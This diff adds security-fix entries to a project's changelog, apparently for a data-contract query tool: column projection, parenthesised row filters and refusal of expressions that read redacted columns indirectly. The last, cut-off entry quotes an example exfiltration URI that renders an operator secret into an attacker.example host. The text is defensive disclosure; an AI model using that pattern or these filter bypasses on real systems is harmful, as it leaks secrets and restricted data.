@@ -249,6 +249,31 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Security
 
+- **The governed `query` tool evaluates every measure, dimension and filter expression over the
+  columns the expose allows.** On an expose with `columnRestrictions` or masking, the statement now
+  reads `FROM (SELECT <allowed columns> FROM <table>) AS _fluid_allowed`, so a restricted column is
+  not part of the relation an expression sees, however the expression is written. The name check
+  stays as the early, readable refusal, and it now reads `"..."` as a quoted identifier on every
+  engine except BigQuery and Spark, where it is a string. `policy.rowFilters` are applied inside the
+  projection, so a row filter may still name a restricted column. On an expose that restricts
+  columns or filters rows, an expression that contains a subquery is refused. Two things a contract
+  author may notice: on such an expose an expression can only use columns declared in
+  `contract.schema` (an undeclared column is no longer projected), and an expose whose schema
+  declares no readable column is refused by `query`. Exposes without restrictions keep the same
+  statement as before, except that every term of the `WHERE` is now parenthesised. `query_sql` takes
+  the engine's quote reading as well.
+- **`query` applies a row filter to every row an expression can see, and refuses a row filter it
+  cannot read.** Each term of the `WHERE` is parenthesised, so a measure, dimension or metric-filter
+  expression containing `OR` can no longer widen the `policy.rowFilters` ANDed to it. A
+  `policy.rowFilters[]` entry that is not an object, has no string `column`, has an operator other
+  than `equals` / `in`, or names two operators is now refused with a validation error on `sample`,
+  `query` and `query_sql`; it used to be skipped.
+- **`query` refuses an expression that would read a redacted column without naming it.** On an
+  expose with columns marked `sensitivity: pii` / `phi` / `sensitive`, a measure, dimension,
+  metric-filter or filter expression may not use `COLUMNS(...)`, `IDENTIFIER(...)`, a `*` that
+  stands for columns, or the table (or `_fluid_allowed`) as a whole-row value. `count(*)`,
+  multiplication, `count(DISTINCT col)` and `sum` / `avg` over a sensitive column are unaffected, and
+  an expression that names a sensitive column is redacted as before.
 - **`{{ env.* }}` on the acquisition path no longer renders the operator's environment into a host
   the contract chooses.** The dispatcher rendered every placeholder from the operator's
   environment before the runner started, so `uri: https://{{ env.OPERATOR_SECRET }}.attacker.example/catalog`
